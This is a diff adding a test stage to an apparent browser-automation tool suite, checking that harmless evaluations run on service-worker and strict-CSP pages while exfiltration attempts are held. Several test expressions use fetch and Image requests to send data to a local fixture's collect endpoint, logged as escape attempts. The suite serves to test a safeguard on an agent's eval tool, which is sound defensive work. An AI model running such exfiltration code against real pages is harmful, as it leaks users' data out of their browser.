@@ -348,6 +348,39 @@ async function main() {
         const own = await step("the iframe's own API call is not held", () => mcp.call("chrome_eval", { tab, frame: "b.localhost", expression: "window.__api('GET', '/api/workflows').then(function (r) { return r.status; })" }));
         need(!own.held && own.ok !== false && val(own) === 200, "eval.frame.guard", `the iframe's own API call was refused or failed: ${short(own)}`);
         return { titleTop: val(inTop), titleFrame: val(inApp), leakHeld: true, ownApiStatus: val(own) };
+      }, 240_000);
+
+      // ---------------------------------------------------------------- (f2) a page with a service worker, and a page under a strict CSP
+      // A harmless eval must RUN on both (a probe the page's own machinery defeats would refuse every eval on that app), and an exfiltration must still reach nothing.
+      await stage("eval_sw_and_csp_pages", async () => {
+        const L = `${fixture.site("fresh")}/collect?d=`;
+        const before = (await state()).collected.length;
+        await step("open the service-worker page", () => mcp.call("chrome_tabs", { action: "navigate", tab, url: `${fixture.site("shell")}/sw-page` }));
+        let controlled = false;
+        for (let i = 0; i < 20 && !controlled; i++) { await sleep(300); const r = await step("is the page controlled by its service worker", () => mcp.call("chrome_eval", { tab, expression: "document.title" })); controlled = val(r) === "SW controlled"; }
+        need(controlled, "eval.sw", "the page never became controlled by its service worker (or every eval on it was refused)");
+        const harmless = await step("a harmless eval on the service-worker page runs", () => mcp.call("chrome_eval", { tab, expression: "navigator.serviceWorker.controller ? 'controlled' : 'not'" }));
+        need(val(harmless) === "controlled" && !harmless.held, "eval.sw", `a harmless eval on a page with a service worker did not run: ${short(harmless)}`);
+        for (const [name, expression] of Object.entries({
+          "sw page fetch": `(async () => { try { await fetch(${JSON.stringify(L)} + 'swfetch'); } catch (e) {} return 1; })()`,
+          "sw page Image": `(async () => { try { new Image().src = ${JSON.stringify(L)} + 'swimage'; } catch (e) {} await new Promise(r => setTimeout(r, 300)); return 1; })()`,
+        })) {
+          const r = await step(`exfil on the service-worker page: ${name}`, () => mcp.call("chrome_eval", { tab, expression }));
+          console.log("[frames-suite] ESCAPE " + JSON.stringify({ name, held: r.held, why: String(r.why || r.error || "").slice(0, 100) }));
+          await sleep(500);
+          need((await state()).collected.length === before, "eval.sw", `"${name}" reached the fresh origin on a page with a service worker`);
+        }
+        await step("open the strict-CSP page", () => mcp.call("chrome_tabs", { action: "navigate", tab, url: `${fixture.site("shell")}/csp-page` }));
+        const t2 = await step("a harmless eval on the strict-CSP page runs", () => mcp.call("chrome_eval", { tab, expression: "document.title" }));
+        need(val(t2) === "CSP page" && !t2.held, "eval.csp", `a harmless eval on a page under a strict CSP did not run: ${short(t2)}`);
+        const r2 = await step("exfil on the strict-CSP page", () => mcp.call("chrome_eval", { tab, expression: `(async () => { try { await fetch(${JSON.stringify(L)} + 'cspfetch'); } catch (e) {} try { new Image().src = ${JSON.stringify(L)} + 'cspimage'; } catch (e) {} await new Promise(r => setTimeout(r, 300)); return 1; })()` }));
+        console.log("[frames-suite] ESCAPE " + JSON.stringify({ name: "csp page exfil", held: r2.held, why: String(r2.why || r2.error || "").slice(0, 100) }));
+        await sleep(500);
+        need((await state()).collected.length === before, "eval.csp", "an exfiltration on a page under a strict CSP reached the fresh origin");
+        // Leave no worker behind: it would control the shell for every later stage.
+        await step("unregister the page's service worker", async () => { await mcp.call("chrome_tabs", { action: "navigate", tab, url: `${fixture.site("shell")}/sw-page` }); await sleep(800); return mcp.call("chrome_eval", { tab, expression: "navigator.serviceWorker.getRegistrations().then(function (rs) { return Promise.all(rs.map(function (r) { return r.unregister(); })); }).then(function (x) { return x.length; })" }); });
+        await fresh();
+        return { controlled, sw: "harmless eval ran, exfil held", csp: "harmless eval ran, exfil held" };
       });
 
       // ---------------------------------------------------------------- (g) network and API learning belong to the iframe
